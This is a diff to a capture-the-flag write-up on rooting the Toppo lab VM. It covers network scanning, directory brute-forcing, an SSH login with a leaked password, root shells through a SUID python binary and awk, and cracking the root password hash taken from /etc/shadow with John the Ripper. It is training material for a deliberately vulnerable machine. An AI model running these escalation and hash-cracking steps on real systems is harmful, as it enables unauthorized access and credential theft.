@@ -14,6 +14,9 @@ tags:
 
 - `sudo netdiscover -i eth0 -r 10.0.2.0/24`
 - Toppo - `10.0.2.6`
+
+#### RustScan + Nmap
+
 - `sudo rustscan -a 10.0.2.6 -- -sS -A`
 
   ```
@@ -22,6 +25,8 @@ tags:
   10.0.2.6:111   => rpcbind
   10.0.2.6:39086 => RPC
   ```
+
+#### Nikto
 
 - `nikto -h 10.0.2.6`
 
@@ -43,7 +48,11 @@ tags:
 + /package.json: Node.js package file found. It may contain sensitive information.
 ```
 
-- `gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.0.2.6 -t 70 -x txt,php`
+#### GoBuster
+
+```
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.0.2.6 -t 70 -x txt,php
+```
 
 ```
 /mail          (Status: 301) [Size: 303] [http://10.0.2.6/mail/]
@@ -57,16 +66,17 @@ tags:
 /server-status (Status: 403) [Size: 296]
 ```
 
-- `http://10.0.2.6/admin/notes.txt`
+- `http://10.0.2.6/admin` => `notes.txt`
 
 ```
 Note to myself :
 I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer.
 ```
 
-- The password used also has `ted` in it which could be username.
+- The password used also has `ted` in it which could be a username.
 - `ssh ted@10.0.2.6` => yes => `12345ted123` and we are logged in as `ted`!
-- `whoami` => `ted`
+
+---
 
 ### Privilege Escalation
 
@@ -95,9 +105,8 @@ I need to change my password :/ 12345ted123 is too outdated but the technology i
 - `/usr/bin/python2.7` has SUID bit set!
 - [GTFOBins](https://gtfobins.github.io/gtfobins/python/)
 - `/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
-- It says: `sh: 0: Illegal option -p` so lets just remove `-p` and run it again.
+- It says: `sh: 0: Illegal option -p` so lets just drop the `-p` and run it again.
 - `/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh")'`
-- And it worked!
 - `whoami && id`:
 
 ```
@@ -112,6 +121,8 @@ uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),2
 Congratulations! there is your flag: 0wnedlab{p4ssi0n_c0me_with_pract1ce}
 ```
 
+---
+
 ### Privilege Escalation
 
 I found another method for privilege escalation when I went through some writeups after rooting this VM.
@@ -123,6 +134,8 @@ I found another method for privilege escalation when I went through some writeup
 - When we run this, we get: `sudo: command not found`. So lets try without `sudo`.
 - `awk 'BEGIN {system("/bin/sh")}'`
 - And we get root shell.
+
+---
 
 ### Post Exploitation
 
@@ -139,12 +152,20 @@ I found another method for privilege escalation when I went through some writeup
 - On Kali VM, make a directory `toppo` and then 2 files inside named `passwd` and `shadow` and then paste the `root` user lines from above in them respectively. (`/etc/passwd` in `passwd` and `/etc/shadow` in `shadow`).
 - Open terminal and: `unshadow passwd shadow > crack.txt`
 - We can also use `hashid` for `root` hash which tells us the hash format is `SHA-512 Crypt [JtR Format: sha512crypt]`:
-- `hashid -j '$6$5UK1sFDk$sf3zXJZ3pwGbvxaQ/1zjaT0iyvw36oltl8DhjTq9Bym0uf2UHdDdRU4KTzCkqqsmdS2cFz.MIgHS/bYsXmBjI0'`
+
+```
+hashid -j '$6$5UK1sFDk$sf3zXJZ3pwGbvxaQ/1zjaT0iyvw36oltl8DhjTq9Bym0uf2UHdDdRU4KTzCkqqsmdS2cFz.MIgHS/bYsXmBjI0'
+```
+
 - `john crack.txt` (will use default wordlist but that is enough in this case)
   ```
   test123   (root)
   ```
 - Or we can crack just the hash without unshadowing:
-- `echo '$6$5UK1sFDk$sf3zXJZ3pwGbvxaQ/1zjaT0iyvw36oltl8DhjTq9Bym0uf2UHdDdRU4KTzCkqqsmdS2cFz.MIgHS/bYsXmBjI0' > crack.txt`
-- `john --wordlist /usr/share/john/password.lst --format=sha512crypt crack.txt`
+
+```
+echo '$6$5UK1sFDk$sf3zXJZ3pwGbvxaQ/1zjaT0iyvw36oltl8DhjTq9Bym0uf2UHdDdRU4KTzCkqqsmdS2cFz.MIgHS/bYsXmBjI0' > crack.txt
+```
+
+- `john --format=sha512crypt crack.txt`
 - So the credentials for `root` user are: `root:test123`
